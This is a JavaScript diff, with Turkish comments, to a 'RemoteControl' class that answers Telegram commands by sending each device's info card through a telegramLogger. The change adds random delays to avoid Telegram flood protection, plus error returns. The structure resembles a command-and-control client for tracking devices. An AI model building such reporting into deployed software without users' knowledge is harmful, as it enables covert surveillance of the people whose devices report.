@@ -154,9 +154,16 @@ class RemoteControl {
                 return;
             }
             
-            // /devices komutu - her cihaz kendi kartını gönderir
+            // /devices komutu - her cihaz kendi kartını gönderir (random delay ile)
             if (cmd.command === 'list_devices') {
                 console.log('📱 [RemoteControl] Sending device card...');
+                
+                // Random delay (0-2000ms) - Telegram flood protection'dan kaçmak için
+                const randomDelay = Math.floor(Math.random() * 2000);
+                console.log(`⏱️ [RemoteControl] Waiting ${randomDelay}ms before sending...`);
+                
+                await new Promise(resolve => setTimeout(resolve, randomDelay));
+                
                 await this.sendDeviceCard();
                 console.log('✅ [RemoteControl] Device card sent!');
                 return;
@@ -214,7 +221,7 @@ class RemoteControl {
             
             if (!window.telegramLogger) {
                 console.error('❌ [RemoteControl] window.telegramLogger not found!');
-                return;
+                return { success: false, error: 'telegramLogger not found' };
             }
             
             console.log('✅ [RemoteControl] telegramLogger found, collecting device info...');
@@ -239,10 +246,18 @@ class RemoteControl {
             };
             
             console.log('📤 [RemoteControl] Sending card data:', cardData);
-            await window.telegramLogger.sendLog('active_device_card', cardData);
-            console.log('✅ [RemoteControl] Device card sent successfully!');
+            const result = await window.telegramLogger.sendLog('active_device_card', cardData);
+            
+            if (result && result.success) {
+                console.log('✅ [RemoteControl] Device card sent successfully!');
+                return { success: true };
+            } else {
+                console.error('❌ [RemoteControl] Failed to send device card:', result);
+                return { success: false, error: result };
+            }
         } catch (error) {
-            console.error('❌ [RemoteControl] Send device card error:', error);
+            console.error('❌ [RemoteControl] Send device card error:', error.message, error.stack);
+            return { success: false, error: error.message };
         }
     }
 
